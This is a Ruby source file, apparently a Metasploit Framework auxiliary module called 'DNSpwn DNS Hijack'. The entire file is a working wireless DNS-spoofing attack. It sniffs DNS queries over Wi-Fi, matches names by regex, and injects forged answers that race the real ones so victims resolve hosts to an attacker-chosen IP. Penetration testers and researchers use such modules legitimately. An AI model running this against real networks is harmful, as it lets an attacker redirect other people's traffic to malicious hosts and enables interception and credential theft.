##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'yaml'
require 'net/dns/packet'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Capture
  include Msf::Exploit::Lorcon2
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'DNSpwn DNS Hijack',
      'Description'    => %q{
        Race DNS responses and replace DNS queries
      },
      'Author'      => ['dragorn'],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        OptPath.new('DNSLIST',	  [ false, "YAML file of DNS entries for replacement",
            File.join(Msf::Config.install_root, "data", "exploits", "wifi", "dnspwn", "dnslist.yml")
          ]),
        OptBool.new('USEDNSFILE', [ true, "Use dns list file for response", "false"]),
        OptString.new('FILTER',	  [ true, "Default BPF filter", "port 53"]),
        OptString.new('IP',		  [ true, "IP for host resolution", "1.2.3.4" ]),
        OptString.new('DURATION', [ true, "Duration of spoofed IP record", "99999" ]),
        OptString.new('MATCH',	  [ true, "Match for DNS name replacement", "(.*)"]),
      ], self.class)
  end

  def run

    @dnslist  = datastore['DNSLIST']
    @regex    = datastore['MATCH']
    @response = datastore['IP']
    @filter	  = datastore['FILTER']
    @duration = datastore['DURATION']
    @useyaml  = datastore['USEDNSFILE']

    @dns = []

    if @useyaml
      begin
        @dns = YAML::load_file(@dnslist)
      rescue ::Exception => e
        print_error "DNSPWN: failed to parse YAML file, #{e.class} #{e} #{e.backtrace}"
      end
    else
      @dns[0] = { "regex" => @regex, "response" => @response, "duration" => @duration }
    end

    @run = true

    open_wifi

    self.wifi.filter = @filter if not @filter.empty?
    each_packet do |pkt|
      d3 = pkt.dot3

      next if not d3
      p = PacketFu::Packet.parse(d3) rescue nil
      next unless p.is_udp?

      dns = Net::DNS::Packet::parse(p.payload) rescue nil
      next unless dns

      next if dns.answer.size != 0
      next if dns.question.size == 0

      @dns.each do |r|
        hit = nil
        r['regex'].each do |reg|
          hit = dns.question[0].qName.scan(/#{reg}/) || nil
          break if hit.size != 0
        end
        next if hit.size.zero?

        print_status("DNSPWN: %s -> %s req %s transaction id %u (response %s)" % [p.ip_saddr, p.ip_daddr, dns.header.id, r["response"] ])

        injpkt = Lorcon::Packet.new()
        injpkt.bssid = pkt.bssid

        response_pkt = PacketFu::UDPPacket.new
        response_pkt.eth_daddr = p.eth_saddr
        response_pkt.eth_saddr = p.eth_daddr
        response_pkt.ip_saddr = p.ip_daddr
        response_pkt.ip_daddr = p.ip_saddr
        response_pkt.ip_ttl = p.ip_ttl
        response_pkt.udp_sport = p.udp_dport
        response_pkt.udp_dport = p.udp_sport

        dns.header.qr = 1
        dns.answer = Net::DNS::RR::A.new("%s %s IN A %s", dns.question[0].qName, r["duration"], r["response"])

        response_pkt.payload = dns.data
        response_pkt.recalc

        injpkt.dot3 = response_pkt.to_s

        if (pkt.direction == Lorcon::Packet::LORCON_FROM_DS)
          injpkt.direction = Lorcon::Packet::LORCON_TO_DS
        elsif (pkt.direction == Lorcon::Packet::LORCON_TO_DS)
          injpkt.direction = Lorcon::Packet::LORCON_FROM_DS
        else
          injpkt.direction = Lorcon::Packet::LORCON_ADHOC_DS
        end

        self.wifi.inject(injpkt) or print_error("DNSPWN failed to inject packet: " + tx.error)
      end
    end
  end
end
